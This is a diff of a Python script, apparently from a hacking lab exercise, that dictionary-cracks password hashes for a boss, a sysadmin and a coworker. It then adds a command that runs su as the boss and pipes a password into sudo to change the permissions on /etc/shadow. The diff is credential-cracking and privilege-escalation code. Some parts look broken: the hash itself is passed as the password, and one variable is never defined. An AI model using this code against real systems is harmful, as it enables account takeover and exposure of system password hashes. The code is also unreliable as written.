@@ -19,17 +19,18 @@ def getHahsedPW (userName, my_intput):
 			return word[1]
 	return "error: no user found"	
 
-boss_password = getHahsedPW("yourboss",my_input)
+bossName = "yourboss"
+
+
+boss_password = getHahsedPW(bossName,my_input)
 sys_admin_password = getHahsedPW("sysadmin",my_input)
 your_buddy_password = getHahsedPW("yourbuddy",my_input)
 
 print(findWord(my_dict.split(),boss_password))
 print(findWord(my_dict.split(),sys_admin_password))
 
+temp = f"su {bossName} -c \"echo {boss_password} | sudo -S chmod 640 /etc/shadow\""
+subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = sudoPW , stderr=subprocess.STDOUT, shell = True)
 
 
 
-'''
-subprocess.run(args, *, stdin=None, input=None, stdout=None,
-stderr=None, shell=False, timeout=None, check=False)
-'''
